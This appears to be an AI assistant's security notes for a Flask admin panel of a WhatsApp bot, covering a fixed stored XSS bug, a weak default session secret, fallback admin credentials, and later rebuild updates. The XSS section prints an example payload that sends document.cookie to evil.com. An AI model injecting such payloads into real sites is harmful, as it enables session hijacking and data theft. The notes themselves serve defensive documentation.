# Security notes

You asked a fair question, and the honest answer is: I hadn't actually
audited this before you asked. I just did, found two real issues, fixed
both, and I'm documenting everything here — including what's still on you
to configure correctly.

## 🔴 Fixed: Stored XSS in the dashboard

**The bug:** Several dashboard values ultimately trace back to raw text a
WhatsApp user typed — most notably the "command" field, which is the first
word of *any* message a user sends to the bot (`text.split()[0]` in
`main.py`), and job/quiz search topics. These were inserted into the page
via `innerHTML` with no escaping in `dashboard.js`.

**The exploit:** A user messages the bot something like:

```
<img/src=x/onerror=fetch('https://evil.com/steal?c='+document.cookie)>
```

No spaces needed, so `.split()[0]` captures the whole thing intact. It gets
logged as an analytics event, and the next time *you* open the admin
dashboard, that string gets dropped into the page as real HTML — the
`onerror` fires, and arbitrary JavaScript runs **in your browser, in your
authenticated session**.

**Why it matters:** your Flask session cookie is `HttpOnly` (JS can't read
it directly), so this specific payload couldn't steal the cookie value
itself — but it *could* make authenticated requests on your behalf, read
anything else on the page, or redirect you somewhere malicious. Stored XSS
in an admin panel is a serious class of bug regardless of exactly what the
first payload does.

**The fix:** every place `dashboard.js` inserts dynamic data into
`innerHTML`, it now runs through an `esc()` function that HTML-escapes
`& < > " '` first. I tested this against the exact payload above — see the
escaped output is inert.

## 🔴 Fixed: weak default `FLASK_SECRET_KEY`

**The bug:** `config.py` fell back to `"dev-only-change-me"` if
`FLASK_SECRET_KEY` wasn't set. Flask signs session cookies with this key —
if you deployed without setting the real environment variable, the secret
would be a value sitting in plain text in this very codebase. Anyone who
saw this code could **forge a valid admin session cookie and walk straight
into the dashboard with no password at all.**

**The fix:** `app.py` now refuses to start in production
(`FLASK_ENV=production`) if the secret is still the dev default. It raises
immediately with instructions to generate a real one, rather than silently
running insecurely.

Also set, while I was in there:
- `SESSION_COOKIE_SECURE = True` in production — the cookie will only ever
  be sent over HTTPS, never accidentally over plain HTTP.
- `SESSION_COOKIE_HTTPONLY = True` — already Flask's default, made explicit.
- `SESSION_COOKIE_SAMESITE = "Lax"` — reduces cross-site request risk.

## 🟡 Your responsibility: the backend's default admin password

This isn't something I can fix in code, because it's about your
configuration, not a bug. Your `auth.py` does the same kind of thing:

```python
admin_pass = os.getenv("DEFAULT_ADMIN_PASS", "AdminPass123!")
```

You told me you've already set `DEFAULT_ADMIN_USER` / `DEFAULT_ADMIN_PASS`
on Render, which is exactly right — just make sure:
- The password is long and random, not something guessable
- It never gets accidentally unset on a redeploy (which would silently
  reseed the fallback `AdminPass123!` the *first* time the admin table is
  empty — it won't overwrite an existing admin row, but it's worth knowing
  the fallback exists)

## How the architecture protects you, by design

A few things worth knowing that are *not* vulnerabilities — they're why
this design is reasonably safe when configured correctly:

- **The bearer token never reaches the browser.** The Flask panel calls
  your FastAPI backend server-to-server, using `requests` from Python code
  — not from JavaScript in the browser. Even in the XSS scenario above,
  the attacker's injected JS running in your browser has no way to read
  that token, because it was never sent to the browser in the first place.
- **The Flask↔backend connection is encrypted**, as long as your
  `BACKEND_URL` is an `https://` Render URL (it is, by default — Render
  terminates TLS automatically). Don't change it to `http://`.
- **Login is rate-limited server-side** — 5 failed attempts locks that
  source IP out for 15 minutes, enforced by `auth.py` on the backend
  itself, not just the Flask panel.
- **Passwords are never stored in plaintext** — PBKDF2 with a random salt,
  100,000 iterations.
- **Raw phone numbers are only ever returned by one endpoint**
  (`/api/analytics/logs`), and it's behind the same session check as
  everything else. Protecting the admin session is what protects that data
  — which is exactly why the two bugs above mattered.

## Still worth doing, if you want to harden further (optional)

These aren't broken, just not as strong as they could be:

- **Logout is a GET request** (`/logout`). Convention is to make
  state-changing actions POST-only to fully rule out CSRF — low risk here
  since the worst case is "attacker logs you out," but worth knowing.
- **No CSRF token on the login form.** Also low risk (an attacker can't
  gain anything by forcing your browser to submit *your* credentials), but
  `Flask-WTF` adds this in a few lines if you want defense-in-depth.
- **No audit log of admin logins** (who logged in, when, from where). Would
  be a nice addition if this ever has more than one admin user.
- **Consider shortening session lifetime** from 24h if this panel will ever
  be used on a shared/public computer.

## If you add more dashboard features later

The pattern to follow: **anything that renders backend-sourced data into
the DOM via `innerHTML` needs to go through `esc()` first.** `textContent`
assignments don't need it (the browser never interprets that as HTML), but
innerHTML does, every time, no exceptions — even for fields that seem safe
today, because "safe today" can become "user-controlled tomorrow" as the
bot grows new commands.

## Update: full visual rebuild (8 pages)

The panel was rebuilt to match a new design (Dashboard, Users, Feature
Analytics, Resume & ATS, Quiz Analytics, Job Search, System Health,
Settings) on the same stack and the same login you already had — `auth.py`,
`backend_client.py`'s `login()`, and `app.py`'s `/login` route are
untouched. Everything above still applies; a few notes specific to the new
pages:

- `dashboard.js` was replaced by `static/js/app.js`, which keeps the same
  `esc()` function and the same rule: every `innerHTML` write in every page
  script runs values through it first (commands, search topics, error
  messages, usernames — anything that traces back to user input or the
  backend).
- The new **Settings** page can only write a small, explicit allow-list of
  non-secret preferences (bot display name, welcome-message text shown in
  this panel, notification toggles, theme/color) — see `settings_store.py`
  on the backend. It has no path to read or write `DEFAULT_ADMIN_PASS`,
  `META_APP_SECRET`, `WHATSAPP_TOKEN`, or the database URL; those fields
  are shown as masked/read-only and link back to "set this in Render,"
  never accepted from the browser.
- The new `/api/data/<endpoint>` proxy route now also accepts `POST` (for
  Settings' save), but it's gated by the same `api_login_required` session
  check as every `GET` — no new unauthenticated surface was added.

## Update: exact-match pass

- `backend_client.login()` now forwards `X-Forwarded-For` (as in your original panel) so the backend's per-IP login rate limit sees the real admin IP.
- `/api/analytics/config` returns only booleans for secrets (set / not set) plus the public webhook URL. No token, verify-token or app-secret value ever reaches the browser.
- Phone numbers in the new Quiz / Resume / Job Search tables are masked (last 4 digits); the full number is only used to link to that user's detail page.
- All new `innerHTML` writes go through `esc()`.
